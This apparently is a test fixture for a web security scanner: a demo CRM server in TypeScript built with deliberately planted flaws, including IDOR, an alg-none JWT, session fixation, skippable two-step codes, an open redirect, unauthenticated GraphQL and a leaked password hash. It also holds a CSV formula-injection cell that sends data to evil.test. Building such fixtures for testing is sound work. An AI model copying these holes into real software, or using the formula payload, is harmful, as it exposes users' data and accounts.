import { createHash, randomBytes } from "node:crypto";
import { createServer, type Server } from "node:http";
import { totp } from "../../src/app/totp.js";

/**
 * A one-page CRM (screens drawn by script, hash addresses like #/contacts) with three users of two
 * client companies, built with planted bugs for the signed-in app checks:
 * - menu items are buttons (no links), with a Reports dropdown and a Notes tab: only clicking finds them
 * - a "Delete all contacts" menu button that must never be clicked
 * - staff's menu hides Users, but staff can open #/admin/users and call /api/admin/users
 * - /api/contacts/:id gives any company's contact (IDOR)
 * - /api/me sends the password hash; /api/stats answers with no login
 * - a JWT with alg none and no end date in localStorage
 * - the session id stays the same after signing in, and signing out keeps it valid
 * - the sign-in page says when an account does not exist
 * - a list whose search does nothing, and an export with a formula cell
 * - a full Aadhaar number on a contact; a POST form without a CSRF token
 * Round 2 (the deeper checks):
 * - the Deals screen reads with a GraphQL query (POST) that also answers with no login, and the
 *   GraphQL schema is open to anyone
 * - Laravel Telescope left open at /telescope/requests
 * - an /admin panel no menu links to, which staff can open
 * - the two-step code can be skipped, and a used code works again
 * - /login?next= sends the browser to any website after signing in
 * - /app may be kept in the browser's cache, so Back after signing out shows it
 * - when the session ends, the screens fail quietly instead of asking to sign in
 * - a live connection (WebSocket) with the login token in its address
 * - on the Users screen, adding a user has no role check (staff can do it too)
 */
export const CRM_ADMIN = { email: "admin@acme.test", password: "Adm1n-Pass-2026" };
export const CRM_STAFF = { email: "staff@acme.test", password: "St4ff-Pass-2026" };
export const CRM_OTHER = { email: "owner@globex.test", password: "Gl0bex-Pass-2026" };
export const CRM_2FA = { email: "secure@acme.test", password: "S3cure-Pass-2026", secret: "JBSWY3DPEHPK3PXP" };

interface User {
  email: string;
  password: string;
  company: string;
  role: "admin" | "staff";
  secret?: string;
}
const USERS: User[] = [
  { ...CRM_ADMIN, company: "acme", role: "admin" },
  { ...CRM_STAFF, company: "acme", role: "staff" },
  { ...CRM_OTHER, company: "globex", role: "admin" },
  { ...CRM_2FA, company: "acme", role: "admin" },
];
const CONTACTS = [
  { id: 1, company: "acme", name: "Asha Verma", email: "asha@acmeclient.in", phone: "98450 11111", aadhaar: "2345 6789 0124" },
  { id: 2, company: "acme", name: "Ravi Kumar", email: "ravi@acmeclient.in", phone: "98450 22222", aadhaar: "" },
  { id: 3, company: "acme", name: "Meena Iyer", email: "meena@acmeclient.in", phone: "98450 33333", aadhaar: "" },
  { id: 4, company: "acme", name: "John Dsouza", email: "john@acmeclient.in", phone: "98450 44444", aadhaar: "" },
  { id: 5, company: "acme", name: "Fatima Shaikh", email: "fatima@acmeclient.in", phone: "98450 55555", aadhaar: "" },
  { id: 9, company: "globex", name: "Globex Buyer", email: "buyer@globexclient.com", phone: "98450 99999", aadhaar: "" },
];

export interface DemoCrm {
  server: Server;
  base: string;
  requested: string[];
  /** Requests that would have changed data, which the test must never send. */
  changes: string[];
}

const b64 = (o: object) => Buffer.from(JSON.stringify(o)).toString("base64url");
const DEALS = [
  { id: 1, company: "acme", title: "Annual support", value: 250000, owner: "admin@acme.test" },
  { id: 2, company: "acme", title: "New branch rollout", value: 200000, owner: "staff@acme.test" },
  { id: 3, company: "globex", title: "Globex pilot", value: 90000, owner: "owner@globex.test" },
];
const SCHEMA = { data: { __schema: { queryType: { name: "Query" }, types: ["Query", "Deal", "Contact", "User", "String", "Int", "Boolean", "__Schema", "__Type"].map((name) => ({ name })) } } };

const APP_HTML = (user: User) => `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Acme CRM</title></head>
<body><header><span>Signed in as ${user.email}</span> <a href="/logout">Sign out</a> <a href="/profile">Profile</a></header>
<aside><nav aria-label="Main">
  <button type="button" data-go="#/dashboard">Dashboard</button>
  <button type="button" data-go="#/contacts">Contacts</button>
  <button type="button" data-go="#/deals">Deals</button>
  <button type="button" aria-haspopup="true" id="reports">Reports</button>
  <div id="reports-menu" role="menu" hidden><button type="button" role="menuitem" data-go="#/reports/sales">Sales report</button><button type="button" role="menuitem" data-go="#/reports/team">Team report</button></div>
  ${user.role === "admin" ? '<button type="button" data-go="#/admin/users">Users</button>' : ""}
  <button type="button" id="wipe">Delete all contacts</button>
</nav></aside>
<main id="screen"><h1>Loading</h1></main>
<script>
localStorage.setItem("crm_token", "${b64({ alg: "none", typ: "JWT" })}.${b64({ sub: user.email, company: user.company, role: user.role })}.");
try { new WebSocket("ws://" + location.host + "/live?token=" + encodeURIComponent(localStorage.getItem("crm_token"))); } catch (e) {}
document.querySelectorAll("[data-go]").forEach(function (b) { b.addEventListener("click", function () { location.hash = b.getAttribute("data-go"); document.getElementById("reports-menu").hidden = true; }); });
document.getElementById("reports").addEventListener("click", function () { var m = document.getElementById("reports-menu"); m.hidden = !m.hidden; });
document.getElementById("wipe").addEventListener("click", function () { fetch("/api/contacts/wipe", { method: "POST" }); });
var screen = document.getElementById("screen");
function show(html) { screen.innerHTML = html; }
function route() {
  var h = location.hash || "#/dashboard";
  fetch("/api/me").then(function (r) { return r.json(); });
  if (h === "#/dashboard") { fetch("/api/stats").then(function (r) { return r.json(); }).then(function (s) { show("<h1>Dashboard</h1><p>" + s.contacts + " contacts this month.</p>"); }); return; }
  if (h === "#/contacts") {
    fetch("/api/contacts").then(function (r) { return r.json(); }).then(function (list) {
      show('<h1>Contacts</h1><div role="tablist"><button role="tab" id="tab-list">List</button><button role="tab" id="tab-notes">Notes</button></div><input type="search" placeholder="Search contacts" id="q"> <a href="/export.csv">Export CSV</a><table><thead><tr><th>Name</th><th>Email</th><th>Phone</th></tr></thead><tbody>' +
        list.map(function (c) { return '<tr><td><a href="#/contacts/' + c.id + '">' + c.name + "</a></td><td>" + c.email + "</td><td>" + c.phone + "</td></tr>"; }).join("") + "</tbody></table>");
    });
    return;
  }
  var m = h.match(/^#\\/contacts\\/(\\d+)$/);
  if (m) { fetch("/api/contacts/" + m[1]).then(function (r) { return r.ok ? r.json() : null; }).then(function (c) { show(c ? "<h1>" + c.name + "</h1><p>" + c.email + " · " + c.phone + "</p>" + (c.aadhaar ? "<p>Aadhaar: " + c.aadhaar + "</p>" : "") : "<h1>Not found</h1>"); }); return; }
  if (h === "#/deals") {
    fetch("/graphql", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ query: "query Deals { deals { id title value owner } }" }) })
      .then(function (r) { return r.json(); })
      .then(function (g) { show("<h1>Deals</h1><p>" + g.data.deals.length + " open deals.</p><ul>" + g.data.deals.map(function (d) { return "<li>" + d.title + " (" + d.owner + ")</li>"; }).join("") + "</ul>"); });
    return;
  }
  if (h === "#/reports/sales") { show("<h1>Sales report</h1><p>Sales are up 12% this quarter compared with last quarter.</p>"); return; }
  if (h === "#/reports/team") { show("<h1>Team report</h1><p>Five people closed deals this month across the team.</p>"); return; }
  if (h === "#/admin/users") {
    fetch("/api/admin/users").then(function (r) { return r.json(); }).then(function (u) {
      show("<h1>Users</h1><ul>" + u.map(function (x) { return "<li>" + x.email + " (" + x.role + ")</li>"; }).join("") + '</ul><label>New user email <input id="new-user"></label> <button type="button" id="add-user">Add user</button><p id="added"></p>');
      document.getElementById("add-user").addEventListener("click", function () {
        fetch("/api/admin/users", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: document.getElementById("new-user").value, role: "staff" }) })
          .then(function (r) { document.getElementById("added").textContent = r.ok ? "Added" : "Not allowed"; });
      });
    });
    return;
  }
  show("<h1>Not found</h1>");
}
window.addEventListener("hashchange", route);
route();
</script></body></html>`;

const page = (title: string, body: string) =>
  `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>${title}</title></head><body><main><h1>${title}</h1>${body}</main></body></html>`;

export function startDemoCrm(port = 4250): Promise<DemoCrm> {
  const base = `http://localhost:${port}`;
  /** session id -> user email (or "" before sign-in, or "2fa:<email>" waiting for the code) */
  const sessions = new Map<string, string>();
  const requested: string[] = [];
  const changes: string[] = [];

  const server = createServer((req, res) => {
    const url = new URL(req.url ?? "/", base);
    requested.push(`${req.method} ${url.pathname}`);
    let sid = /(?:^|;\s*)crm_session=(\w+)/.exec(req.headers.cookie ?? "")?.[1];
    const who = sid ? sessions.get(sid) : undefined;
    // Planted: a session waiting for its two-step code already counts as signed in.
    const user = who ? USERS.find((u) => u.email === (who.startsWith("2fa:") ? who.slice(4) : who)) : undefined;
    const send = (status: number, type: string, body: string, headers: Record<string, string> = {}) =>
      res.writeHead(status, { "content-type": type, "cache-control": "no-store", ...headers }).end(body);
    const html = (status: number, body: string, headers: Record<string, string> = {}) => send(status, "text/html; charset=utf-8", body, headers);
    const json = (status: number, body: unknown) => send(status, "application/json", JSON.stringify(body));
    const redirect = (to: string, headers: Record<string, string> = {}) => res.writeHead(302, { location: to, ...headers }).end();
    const readBody = (fn: (f: URLSearchParams) => void, raw?: (b: string) => void) => {
      let b = "";
      req.on("data", (c) => (b += c));
      req.on("end", () => (raw ? raw(b) : fn(new URLSearchParams(b))));
    };
    const form = (error = "") =>
      page(
        "Sign in to Acme CRM",
        `${error ? `<div role="alert">${error}</div>` : ""}<form method="post" action="/login${url.search}"><label>Email <input type="email" name="email" autocomplete="username"></label>
         <label>Password <input type="password" name="password" autocomplete="current-password"></label><button type="submit">Sign in</button></form>`,
      );

    if (url.pathname === "/login" && req.method === "GET") {
      // A session before signing in, that signing in keeps (planted: session fixation).
      if (!sid) {
        sid = randomBytes(8).toString("hex");
        sessions.set(sid, "");
        return html(200, form(), { "set-cookie": `crm_session=${sid}; Path=/; HttpOnly; SameSite=Lax; Max-Age=7776000` });
      }
      return html(200, form());
    }
    if (url.pathname === "/login" && req.method === "POST") {
      return readBody((f) => {
        const u = USERS.find((x) => x.email === f.get("email"));
        if (!u) return html(200, form("No account with that email address."));
        if (u.password !== f.get("password")) return html(200, form("Wrong password."));
        const id = sid && sessions.has(sid) ? sid : randomBytes(8).toString("hex");
        if (u.secret) {
          sessions.set(id, `2fa:${u.email}`);
          return redirect("/login/2fa", { "set-cookie": `crm_session=${id}; Path=/; HttpOnly; SameSite=Lax; Max-Age=7776000` });
        }
        sessions.set(id, u.email);
        // Planted: any address in ?next= is followed after signing in.
        redirect(url.searchParams.get("next") || "/app", { "set-cookie": `crm_session=${id}; Path=/; HttpOnly; SameSite=Lax; Max-Age=7776000` });
      });
    }
    if (url.pathname === "/login/2fa") {
      const waiting = who?.startsWith("2fa:") ? USERS.find((u) => u.email === who.slice(4)) : undefined;
      if (!waiting) return redirect("/login");
      if (req.method === "POST") {
        return readBody((f) => {
          // Like most real servers (RFC 6238 section 5.2), accept the current code and the one
          // before it, so a slow test run that crosses a 30-second boundary still sees a reused
          // code accepted.
          const otp = f.get("otp");
          if (otp === totp(waiting.secret!) || otp === totp(waiting.secret!, Date.now() - 30_000)) {
            sessions.set(sid!, waiting.email);
            return redirect("/app");
          }
          html(200, page("Two-step code", `<div role="alert">Wrong code.</div><form method="post"><label>Code <input name="otp" autocomplete="one-time-code"></label><button type="submit">Verify</button></form>`));
        });
      }
      return html(200, page("Two-step code", `<form method="post"><label>Code <input name="otp" autocomplete="one-time-code"></label><button type="submit">Verify</button></form>`));
    }
    // Planted: answers with no login.
    if (url.pathname === "/api/stats") return json(200, { contacts: 5, deals: 3, top: "asha@acmeclient.in" });
    // Planted: Laravel Telescope left open.
    if (url.pathname.startsWith("/telescope")) {
      return html(200, '<!doctype html><html><head><title>Telescope</title></head><body><div id="telescope" v-cloak></div><script>window.Telescope = {"path":"telescope","timezone":"UTC"};</script><script src="/vendor/telescope/app.js"></script></body></html>');
    }
    // GraphQL: queries read, with no login check (planted), and the schema is open to anyone (planted).
    if (url.pathname === "/graphql" && req.method === "POST") {
      return readBody((_f) => undefined, (raw) => {
        let q = "";
        try {
          q = String(JSON.parse(raw).query ?? "");
        } catch {
          return json(400, { errors: [{ message: "Bad JSON" }] });
        }
        if (/\bmutation\b/.test(q)) {
          changes.push("POST /graphql mutation");
          return json(200, { data: { ok: true } });
        }
        if (q.includes("__schema")) return json(200, SCHEMA);
        const company = user?.company ?? "acme";
        if (q.includes("deals")) return json(200, { data: { deals: DEALS.filter((d) => d.company === company).map(({ company: _c, ...d }) => d) } });
        return json(200, { errors: [{ message: "Unknown query" }] });
      });
    }
    if (url.pathname === "/") return redirect(user ? "/app" : "/login");

    if (!user) {
      if (url.pathname.startsWith("/api/")) return json(401, { error: "Sign in first" });
      return redirect(`/login?next=${encodeURIComponent(url.pathname)}`);
    }
    if (req.method !== "GET" && req.method !== "HEAD") {
      changes.push(`${req.method} ${url.pathname}`);
      return json(200, { ok: true });
    }
    // Planted: the session stays valid on the server after signing out.
    if (url.pathname === "/logout") return html(200, page("Signed out", '<p>You are signed out.</p><a href="/login">Sign in again</a>'), { "set-cookie": "crm_session=; Path=/; Max-Age=0" });
    // Planted: the browser may keep the signed-in app in its cache (Back after signing out shows it).
    if (url.pathname === "/app") return html(200, APP_HTML(user), { "cache-control": "private, max-age=600" });
    // Planted: an admin panel no menu links to, with no role check.
    if (url.pathname === "/admin") {
      const list = USERS.filter((u) => u.company === user.company).map((u) => `<li>${u.email}, ${u.role}</li>`).join("");
      return html(200, page("Admin panel", `<h2>All users of ${user.company}</h2><ul>${list}</ul><h2>Settings</h2><p>Billing plan: Business. Seats: 25. Data kept for 7 years.</p>`));
    }
    if (url.pathname === "/profile") {
      return html(200, page("Profile", `<p>Signed in as ${user.email}.</p><form method="post" action="/profile"><label>Name <input name="name" value="Admin"></label><button type="submit">Save</button></form><a href="/app">Back</a>`));
    }
    if (url.pathname === "/export.csv") {
      const rows = CONTACTS.filter((c) => c.company === user.company).map((c) => `${c.name},${c.email},${c.phone}`);
      return send(200, "text/csv", ["Name,Email,Phone", ...rows, '=HYPERLINK("http://evil.test?x="&A2;"Click"),bad@acmeclient.in,1'].join("\n"));
    }
    if (url.pathname === "/api/me") return json(200, { email: user.email, role: user.role, company: user.company, password_hash: "$2y$10$abcdefghijklmnopqrstuv" });
    if (url.pathname === "/api/contacts") return json(200, CONTACTS.filter((c) => c.company === user.company).map(({ aadhaar: _a, ...c }) => c));
    const one = url.pathname.match(/^\/api\/contacts\/(\d+)$/);
    if (one) {
      // Planted: no check that the contact belongs to the user's company.
      const c = CONTACTS.find((x) => x.id === Number(one[1]));
      return c ? json(200, c) : json(404, { error: "Not found" });
    }
    // Planted: no role check.
    if (url.pathname === "/api/admin/users") return json(200, USERS.filter((u) => u.company === user.company).map((u) => ({ email: u.email, role: u.role })));
    return html(404, page("Not found", "<p>No such page.</p>"));
  });
  // Live connections: accept the WebSocket handshake and keep it open (no messages).
  server.on("upgrade", (req, socket) => {
    requested.push(`WS ${new URL(req.url ?? "/", base).pathname}`);
    const key = String(req.headers["sec-websocket-key"] ?? "");
    const accept = createHash("sha1").update(`${key}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64");
    socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${accept}\r\n\r\n`);
    socket.on("error", () => {});
    live.add(socket);
    socket.on("close", () => live.delete(socket));
  });
  // Closing the demo also closes its live connections, so the test process can end.
  const live = new Set<import("node:stream").Duplex>();
  const close = server.close.bind(server);
  server.close = ((cb?: (err?: Error) => void) => {
    for (const s of live) s.destroy();
    return close(cb);
  }) as typeof server.close;
  return new Promise((resolve) => server.listen(port, () => resolve({ server, base, requested, changes })));
}
